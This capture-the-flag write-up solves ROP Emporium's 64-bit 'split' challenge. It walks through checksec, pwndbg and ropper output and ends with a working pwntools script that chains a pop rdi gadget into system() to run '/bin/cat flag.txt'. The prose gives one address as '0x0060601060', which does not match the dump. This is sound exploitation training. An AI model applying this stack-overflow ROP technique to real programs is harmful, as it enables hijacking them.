## 64 bits

```bash
$ checksec split
[*] '/home/localuser/ropemporium/split/64bits/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Now I'll open it on gdb to start analysing it.

```bash
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400742  usefulFunction
0x0000000000400760  __libc_csu_init
0x00000000004007d0  __libc_csu_fini
0x00000000004007d4  _fini
```

`main` calls `pwnme`, and pwnme is vulnerable to a buffer overflow because it is using the `read` function, there's also a function named `usefulFunction`:

```bash
pwndbg> disassemble usefulFunction 
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:     push   rbp
   0x0000000000400743 <+1>:     mov    rbp,rsp
   0x0000000000400746 <+4>:     mov    edi,0x40084a
   0x000000000040074b <+9>:     call   0x400560 <system@plt>
   0x0000000000400750 <+14>:    nop
   0x0000000000400751 <+15>:    pop    rbp
   0x0000000000400752 <+16>:    ret    
End of assembler dump.
```

Now there isn't `/bin/cat flag.txt` but using readelf you can find it on the address `0x0060601060`

```bash
$ readelf -x .data split

Hex dump of section '.data':
  0x00601050 00000000 00000000 00000000 00000000 ................
  0x00601060 2f62696e 2f636174 20666c61 672e7478 /bin/cat flag.tx
  0x00601070 7400                                t.
```

Now with the buffer overflow we can jump to `system`, but before it we need to change the value of `EDI`, for this we'll use a ROP gadget that pops the value of `edi`, I'll use ropper:

```bash
$ ropper
(ropper)> file split                                                                                                                                                                   
(split/ELF/x86_64)> gadgets   
----
----
0x00000000004007c3: pop rdi; ret;
---
---
```

Now we have everything to make the exploit:

```python
from pwn import *

p = process("./split")
elf = ELF("./split")

pop_rdi = p64(0x4007c3)
cat_flag = p64(0x00601060) 
sys_addr = p64(0x40074b)

payload = b"a"*40
payload += pop_rdi
payload += cat_flag
payload += sys_addr


p.recvuntil(">")
p.sendline(payload)
p.recvline()
p.interactive() 
```
